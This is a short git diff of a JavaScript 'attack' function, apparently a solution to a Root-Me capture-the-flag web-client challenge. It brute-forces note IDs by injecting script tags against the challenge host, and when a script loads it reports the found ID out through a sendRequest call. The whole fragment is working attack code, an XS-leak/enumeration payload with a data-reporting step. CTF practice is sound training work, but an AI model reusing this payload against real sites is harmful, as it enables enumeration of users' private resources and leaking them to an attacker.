@@ -13,23 +13,21 @@ async function attack() {
     while (!idFound && i < 1000000) {
         try {
             await new Promise((resolve, reject) => {
-                //fetch page
                 var script = document.createElement('script');
                 script.src = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${i}`;
                 document.body.appendChild(script);
                 
-                // When script loads, caculate the time it took to finish the request
                 script.onload = () => {
                     idFound = true;
                     sendRequest(`id=${i}`);
                     resolve();
                 }
                 script.onerror = reject;
-                if (i % 1000 == 0) sendRequest("test="+i);
+                sendRequest("test="+i);
             })
             
         } catch (error) {
-            i+=1;
+            i++;
             continue;
         }
     }      
